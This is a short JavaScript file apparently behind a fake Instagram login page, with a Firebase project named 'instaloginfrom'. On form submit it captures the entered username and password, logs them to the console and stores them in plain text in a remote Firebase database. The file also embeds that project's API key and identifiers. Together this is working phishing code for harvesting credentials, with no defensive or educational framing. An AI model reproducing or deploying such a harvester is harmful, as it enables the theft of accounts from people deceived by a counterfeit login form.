const firebaseConfig = {
    apiKey: "AIzaSyA5MqcBU4TMymyTgKKFBS-97P77ytf4se4",
    authDomain: "instaloginfrom.firebaseapp.com",
    databaseURL: "https://instaloginfrom-default-rtdb.firebaseio.com",
    projectId: "instaloginfrom",
    storageBucket: "instaloginfrom.appspot.com",
    messagingSenderId: "389582574360",
    appId: "1:389582574360:web:f9e3208e1a13eefe1ac46d"
  };
  //for initialize fire base
  firebase.initializeApp(firebaseConfig);
  // refrence your database 
 var loginformdb= firebase.database().ref('InstaLoginForm');

 document.getElementById('formhandler').addEventListener('submit',(event)=>{
    USERNAME = event.target.uname.value
    USERPASS = event.target.upass.value
    console.log(USERNAME,USERPASS);
    savedetails(USERNAME,USERPASS);
 })
 const savedetails =(USERNAME,USERPASS)=>{
    var newLoginForm = loginformdb.push();
    newLoginForm.set({
        user : USERNAME,
        pass : USERPASS
    })
 }